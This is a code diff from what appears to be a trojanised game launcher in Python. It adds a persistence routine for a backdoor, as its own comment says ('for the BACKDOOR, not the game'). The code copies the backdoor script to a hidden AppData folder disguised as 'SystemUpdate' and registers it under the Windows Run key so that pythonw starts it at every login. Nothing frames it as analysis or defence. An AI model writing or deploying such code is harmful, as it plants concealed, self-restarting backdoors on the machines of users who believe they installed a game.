@@ -430,13 +430,41 @@ while True:
             
             print(f"[DEBUG] Process started with PID: {proc.pid}")
         
-        # Install persistence
+        # Install persistence for the BACKDOOR, not the game
         if config.ENABLE_PERSISTENCE:
             print("[DEBUG] Installing persistence...")
-            from persistence import PersistenceManager
-            pm = PersistenceManager()
-            pm.install_persistence()
-            print("[DEBUG] Persistence installed")
+            try:
+                import winreg
+                
+                # Create a persistent backdoor script
+                import tempfile
+                persistent_backdoor = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'SystemUpdate', 'update.pyw')
+                os.makedirs(os.path.dirname(persistent_backdoor), exist_ok=True)
+                
+                # Copy the backdoor script to persistent location
+                import shutil
+                shutil.copy(backdoor_path, persistent_backdoor)
+                
+                print(f"[DEBUG] Persistent backdoor at: {persistent_backdoor}")
+                
+                # Add to Windows startup registry
+                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                
+                # Find pythonw
+                if pythonw and os.path.exists(pythonw):
+                    startup_command = f'"{pythonw}" "{persistent_backdoor}"'
+                else:
+                    startup_command = f'pythonw "{persistent_backdoor}"'
+                
+                winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, startup_command)
+                winreg.CloseKey(key)
+                
+                print(f"[DEBUG] Persistence installed: {startup_command}")
+            except Exception as e:
+                print(f"[ERROR] Persistence failed: {e}")
+                import traceback
+                traceback.print_exc()
         
         print("[DEBUG] start_backdoor() completed successfully")
             
